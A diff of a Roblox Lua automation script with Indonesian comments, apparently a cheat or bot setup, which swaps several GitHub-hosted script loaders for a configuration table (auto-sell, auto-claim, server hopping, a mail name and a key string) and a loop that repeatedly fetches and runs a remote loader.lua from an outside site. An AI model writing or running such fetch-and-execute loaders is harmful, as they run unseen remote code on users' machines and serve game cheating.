@@ -1,16 +1,22 @@
--- Menjalankan script dari URL secara berurutan dengan wait di antaranya
-print("Full Script Is Running")
--- Script 1: ClaimUnitAwal
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LocasTheBoys/Oracle/main/ClaimUnitAwal"))()
-wait(1) -- Memberi waktu sebelum lanjut ke script berikutnya
+--print("KE 2 JUAL JUAL")
+getgenv().Config = {
+    ["AutoListForSale"] = true,
+    ["SelectProduct"] = "PencilCrate",--untuk plaza auto sell
+    ["ALFS_HopServer"] = true,--Ini untuk plaza
+    ["ALFS_DelayHop"] = 30,--Ini untuk plaza satuan (Menit)
+    ["GemPrice"] = "55", --GANTI HARGANYA
+    ["WH_MailSent"] = false,
+    ["MailName"] = "Gansdangvp2t",
+    ["RequiredGem"] = 2000,
+    ["DelayJoin"] = 15,
+    ["AutoClaimEventPass"] = true,
+    ["AutoBuyEvent"] = true, --buy crates event
+    ["AutoClaimQuest"] = true,
+    ["AutoClaimEventQuest"] = true,
+    ["DeleteMap"] = true,
+    ["AutoRejoin"] = true,
+    ["BoostFPS"] = true,
+}
+getgenv().Key = "k29557962ec037367941922a"
 
--- Script 2: SCClaimCodes
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LocasTheBoys/Oracle/main/SCClaimCodes"))()
-wait(1) -- Sesuaikan durasi jika perlu
-
--- Script 3: SCTutorClaim
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LocasTheBoys/Oracle/main/SCTutorClaim"))()
-wait(1)
-
--- Script 5: ClaimDaily
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LocasTheBoys/Oracle/main/ClaimDaily"))()
+repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden
